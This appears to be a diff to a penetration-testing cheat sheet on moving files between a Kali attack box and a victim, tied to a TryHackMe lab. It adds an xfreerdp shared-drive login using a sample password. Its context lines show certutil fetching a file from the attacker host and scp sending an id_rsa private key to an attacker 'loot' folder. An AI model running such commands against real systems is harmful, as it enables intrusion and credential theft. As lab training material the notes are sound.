@@ -97,7 +97,25 @@ certutil -urlcache -f http://$KALI:82/$FILE $FILE
 scp id_rsa root@$KALI:/root/loot
 ```
 
+## xfreerdp
 
+**Example**
+
+[windows-privesc-arena.md](../walkthroughs/tryhackme/windows-privesc-arena.md "mention")
+
+Login via RDP and setup shared drive
+
+**Kali**
+
+```
+xfreerdp +clipboard /u:user /p:password321 /cert:ignore /v:$VICTIM /size:1024x568  /drive:kali,/root/
+```
+
+**Victim**
+
+```
+copy "C:\Users\User\Desktop\Tools\Source\windows_service.c" \\tsclient\kali\windows_service.c
+```
 
 
 
@@ -126,3 +144,8 @@ python2 -m SimpleHTTPServer 82
 ```
 python3 -m http.server 82
 ```
+
+
+
+
+
